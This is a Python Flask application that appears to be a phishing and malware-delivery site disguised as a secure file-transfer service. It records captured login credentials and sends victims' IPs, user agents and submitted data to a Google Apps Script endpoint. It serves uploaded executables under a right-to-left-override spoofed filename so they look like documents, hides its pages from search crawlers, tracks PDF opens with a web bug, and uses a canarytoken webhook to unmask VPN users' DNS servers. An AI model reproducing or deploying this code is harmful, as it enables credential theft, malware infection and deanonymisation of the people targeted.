import os
import json
import threading
import uuid
import datetime
import requests
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response, abort
from fpdf import FPDF

app = Flask(__name__)

# --- КОНФИГУРАЦИЯ ---
UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'

if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}
# Твой Google Script URL
GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"

# --- БАЗА ДАННЫХ ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f: json.dump(data, f)
    except Exception as e: print(f"DB Save Error: {e}")

db = load_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- ЛОГГЕР ---
def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
    try:
        # ПИШЕМ ПАРОЛЬ В КОНСОЛЬ (для отладки на Render)
        if 'system' in data and 'phishing_password' in data['system']:
            print(f"\n[!!!] CREDENTIALS CAPTURED: {data['system']['phishing_login']} : {data['system']['phishing_password']}\n")
        
        payload = {
            "trigger": trigger_type,
            "ip": user_ip,
            "user_agent": user_agent,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "details": data
        }
        requests.post(GOOGLE_SCRIPT_URL, json=payload)
    except Exception as e:
        print(f"[-] Logger Error: {e}")

# --- PDF ---
class PDFReceipt(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'SECURE TRANSFER RECEIPT', 0, 1, 'C')

def generate_receipt(uid, filename):
    pdf = PDFReceipt()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
    pdf.cell(200, 10, txt=f"ID: {uid}", ln=1)
    pdf.set_text_color(255, 0, 0)
    pdf.cell(200, 10, txt="STATUS: PENDING. CLICK TO OPEN.", ln=1)
    # Ссылка внутри PDF (Web Bug)
    tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
    pdf.link(0, 0, 210, 297, tracking_url)
    receipt_name = f"receipt_{uid}.pdf"
    path = os.path.join(app.config['UPLOAD_FOLDER'], receipt_name)
    pdf.output(path)
    return receipt_name

# --- ROUTES ---
@app.route('/health')
def health_check(): return "OK", 200

# === НОВЫЙ ROUTE: WEBHOOK ДЛЯ CANARYTOKENS ===
@app.route('/webhook', methods=['POST'])
def canary_webhook():
    try:
        # Canarytokens может слать данные как JSON или Form Data
        data = request.json or request.form.to_dict()
        
        # Пытаемся извлечь IP DNS-сервера (это самое ценное при утечке)
        canary_ip = "Unknown"
        if 'source_ip' in data: canary_ip = data['source_ip']
        elif 'ip' in data: canary_ip = data['ip']
        
        # Формируем отчет
        report_data = {
            "meta": {
                "trigger": "DNS LEAK DETECTED (Canary)",
                "url": "Webhook Hit",
                "info": "This IP belongs to the DNS server used by the victim. If different from VPN IP -> LEAK CONFIRMED."
            },
            "network": {
                "dns_leak_ip": canary_ip,
                "full_canary_payload": data
            }
        }
        
        # Отправляем в Google Script
        threading.Thread(target=send_email_background, args=(report_data, canary_ip, "Canarytokens Webhook", "DNS LEAK")).start()
        
        return jsonify({"status": "logged"}), 200
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)}), 500
# =============================================

@app.route('/pixel.gif')
def tracking_pixel():
    source = request.args.get('source', 'unknown')
    uid = request.args.get('uid', 'unknown')
    # Получаем реальный IP для пикселя
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    threading.Thread(target=send_email_background, args=({'meta': {'url': f'PDF TRAP ({uid})', 'source': source}}, ip, "PDF Reader", "PDF OPENED")).start()
    return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'files' not in request.files: return redirect(request.url)
        files = request.files.getlist('files')
        uploaded_files = []
        for file in files:
            if file and allowed_file(file.filename):
                original_filename = file.filename
                try: ext = original_filename.rsplit('.', 1)[1].lower()
                except: ext = "bin"
                saved_filename = f"{uuid.uuid4().hex}.{ext}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
                uploaded_files.append({'name': original_filename, 'saved_name': saved_filename, 'format': ext.upper(), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
        if uploaded_files:
            unique_id = uuid.uuid4().hex[:6]
            db[unique_id] = {'files': uploaded_files, 'comments': []}
            save_db(db)
            return redirect(f"/{unique_id}")
    return render_template('index.html')

@app.route('/<unique_id>')
def view_files(unique_id):
    global db
    db = load_db()
    data = db.get(unique_id)
    if not data: return "File not found", 404
    return render_template('view.html', files=data['files'], uid=unique_id, db_data=data)

@app.route('/verify/<uid>/<path:filename>')
def verify_download(uid, filename):
    user_agent = request.headers.get('User-Agent', '').lower()
    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse']
    if any(bot in user_agent for bot in bots): return "<h1>Loading...</h1>", 200
    return render_template('semyanich.html', uid=uid, filename=filename)

@app.route('/download/<uid>/<path:filename>')
def download_file(uid, filename):
    data = db.get(uid)
    if not data: return abort(404)
    target_file = next((f for f in data['files'] if f['name'] == filename), None)
    if target_file:
        spoofed_name = target_file['name']
        if target_file['saved_name'].endswith(('.exe', '.scr', '.bat')): spoofed_name = "Document_\u202ecod.exe"
        return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=spoofed_name)
    return abort(404)

@app.route('/download_receipt/<uid>')
def download_receipt(uid):
    filename = generate_receipt(uid, "Secure_Download")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/collect', methods=['POST'])
def collect_data():
    try:
        if request.is_json:
            data = request.json
        else:
            data = json.loads(request.data.decode('utf-8'))
        
        # Получаем реальный IP из заголовков Render/Cloudflare
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        if forwarded_for:
            real_ip = forwarded_for.split(',')[0].strip()
        else:
            real_ip = request.remote_addr

        if 'network' not in data: data['network'] = {}
        data['network']['server_detected_ip'] = real_ip
        data['network']['raw_headers_ip'] = forwarded_for
        
        user_agent = request.headers.get('User-Agent')
        trigger = data.get('meta', {}).get('trigger', 'Unknown')
        
        threading.Thread(target=send_email_background, args=(data, real_ip, user_agent, trigger)).start()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/comment', methods=['POST'])
def add_comment():
    data = request.json
    uid = data.get('uid')
    if uid in db:
        if 'comments' not in db[uid]: db[uid]['comments'] = []
        db[uid]['comments'].append({'username': data.get('username'), 'text': data.get('text'), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
        save_db(db)
        
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
        
        threading.Thread(target=send_email_background, args=(data, real_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
